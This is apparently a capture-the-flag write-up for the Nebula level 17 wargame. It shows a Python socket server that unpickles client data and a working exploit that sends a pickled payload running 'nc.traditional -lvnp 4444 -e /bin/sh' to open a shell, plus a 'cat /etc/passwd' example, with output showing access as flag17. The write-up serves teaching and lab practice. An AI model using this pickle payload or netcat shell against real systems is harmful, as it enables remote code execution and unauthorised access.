Question URL: https://exploit.education/nebula/level-17/

Source Code:
# pickle - package for serializing and de-serializing a Python object structure
import os
import pickle
import time
import socket
import signal

# signal.signal(signal_num, handler) - SIGCHLD signal will be handled by the
# specified handler.
# signal.SIGCHLD: When a stopped process is continued, a SIGCHLD singal may
# be generated for its parent process, unless the parent process has set the
# SA_NOCLDSTOP flag.
# signal.SIG_IGN: Standard signal handler, which will simply ignore the
# given signal
signal.signal(signal.SIGCHLD, signal.SIG_IGN)

def server(skt):
        # socket.recv(bufsize[, flags])
        # Receive data from the socket. The return value is a string representing the data received. 
        # The maximum amount of data to be received at once is specified by bufsize.
        line = skt.recv(1024)

        # pickle.loads(bytes_object, *, fix_imports=True, encoding="ASCII", errors="strict")
        # Read a pickled object hierarchy from a bytes object and return the reconstituted object hierarchy 
        # specified therein. The protocol version of the pickle is detected automatically, so no protocol 
        # argument is needed. Bytes past the pickled objectâ€™s representation are ignored.
        obj = pickle.loads(line)

        for i in obj:
                clnt.send("why did you send me " + i + "?\n")

skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
skt.bind(('0.0.0.0', 10007))
skt.listen(10)

while True:
        # socket.accept()
        # Accept a connection. The socket must be bound to an address and
        # listening for connections. The return value is a pair (conn, address)
        #  where conn is a new socket object usable to send and receive data
        # on the connection, and address is the address bound to the socket
        # on the other end of the connection.
        
        # Server process continues accept() next client connections.
        clnt, addr = skt.accept()

        # fork() - Creates a new process by duplicating the calling process.
        # The new process, referred to as the child, is an exact duplicate of
        # the calling process except some.
        # Return:
        #  Success - PID of the child process is returned in the parent
        #            0 is returned in the child.
        #  Failure - -l is returned in the parent
        #            no child process is created
        
        # Client process takes care of established connection
        if(os.fork() == 0):
                clnt.send("Accepted connection from %s:%d" % (addr[0], addr[1]))
                server(clnt)
                exit(1)

Code Analysis - Python Socket programming
a. Server listening on port 10007 and running with the privilege of flag17
 skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
 skt.bind(('0.0.0.0', 10007))
 skt.listen(10)

b. When clients make connections, child process is forked. 
 Server process continue listening on port 10007 for next client connection
 Child process sends an initial message ("Accepted connection from CLIENT_IP:CLIENT_PORT") and waits for next message
 
c. From the child process, pickle.loads() function de-serializes(unpickle) received data and send the received data to the client.
 obj = pickle.loads(line)  <== Vulnerable code
 for i in obj:
     clnt.send("why did you send me " + i + "?\n")

Vulnerabilty and exploit plan
a. pickle vulnerability
- When pickle is instantiated, __reduce__ method (constructor) is called. The first argument to __reduce__ is a callable, 
that is, a function. The next argument is a tuple of arguments for __reduce__. In below example, os.system is the first argument
and 'cat /etc/passwd' is the second argument. Therefore if we overload pickle's __reduce__() with properly modified exploit code
and serialize it (pickle.dumps()), the exploit code can be executed during pickle.loads().

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('cat /etc/passwd',))
        
b. Basically exploit can be done various way depending on how we place exploit code with __reduce__()

Sol A. - Use reverse shell
a. Build client python code which makes a connection to a server on 10007 and send exploit code.
// exploit.py
import os
import pickle
import socket


class Exploit(object):
    def __reduce__(self):
        return (os.system, ('nc.traditional -lvnp 4444 -e /bin/sh',))

skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
skt.connect(('localhost', 10007))
data = skt.recv(1024)
print("Received: " + data)
obj = Exploit()
shellcode = pickle.dumps(obj)
print("Sending shellcode: " + shellcode)
skt.send(shellcode)
data = skt.recv(1024)
print("Received: " + data)

level17@nebula:~$ python exploit.py
Received: Accepted connection from 127.0.0.1:35876
Sending shellcode: cposix
system
p0
(S'nc.traditional -lvnp 4444 -e /bin/sh'
p1
tp2
Rp3
.

b. Now let's make a connection to 4444 where revershell is setup
level17@nebula:~$ nc 127.0.0.1 4444
id
uid=982(flag17) gid=982(flag17) groups=982(flag17)
getflag
You have successfully executed getflag on a target account
